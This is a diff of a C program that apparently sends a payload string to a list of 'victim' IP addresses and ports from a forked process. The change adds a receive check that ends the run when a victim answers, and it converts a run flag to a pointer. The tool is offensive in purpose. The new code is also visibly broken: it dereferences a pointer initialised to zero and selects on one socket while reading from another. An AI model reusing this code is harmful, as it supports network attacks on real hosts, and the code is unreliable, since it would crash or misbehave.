@@ -15,7 +15,7 @@
 #define PAYLOAD_MAX 1024+1
 
 
-int run_process_on = 0;
+int *run_process_on = 0;
 
 void usage()
 {
@@ -173,7 +173,9 @@ void run(int sockfd, struct msg message, char *payload)
 		
 		while(str != NULL){	
 			for(int i = 0; i < message.number_of_pairs; ++i){
-				
+				read_fds = master;
+				char buf[PAYLOAD_MAX];
+
 				struct addrinfo hints, *res;
 				
 				memset(&hints, 0, sizeof(hints));
@@ -182,6 +184,17 @@ void run(int sockfd, struct msg message, char *payload)
 				
 				w_getaddrinfo(message.entry[i].ip_address, message.entry[i].port_number, &hints, &res);
 				
+				socklen_t addrlen = res->ai_addrlen;
+				w_select(fdmax+1, &read_fds, NULL, NULL, NULL);
+				if(FD_ISSET(sockfd, &read_fds)){
+					if((w_recvfrom(listener, buf, PAYLOAD_MAX, 0, res->ai_addr, &addrlen)) > 0){
+						printf("Received something from victim.\n");
+						freeaddrinfo(res);
+						close(listener);
+						return;
+					}
+				}
+
 				w_sendto(sockfd, str, strlen(str), 0, res->ai_addr, res->ai_addrlen);
 				
 				freeaddrinfo(res);
@@ -199,7 +212,7 @@ void stop(int pid)
 	if(pid != 0)
 		kill(pid, SIGTERM);
 	
-	run_process_on = 0;
+	*run_process_on = 0;
 	return;
 }
 
@@ -248,11 +261,11 @@ int main(int argc, char **argv)
 				prog_flag = 1;
 				break;
 			case '3':
-				if(prog_flag && !run_process_on){
-					run_process_on = 1;
+				if(prog_flag && !(*run_process_on)){
+					*run_process_on = 1;
 					if((pid = fork()) == 0){
 						run(sockfd, message, payload);
-						run_process_on = 0;
+						*run_process_on = 0;
 						exit(0);
 					}
 				}
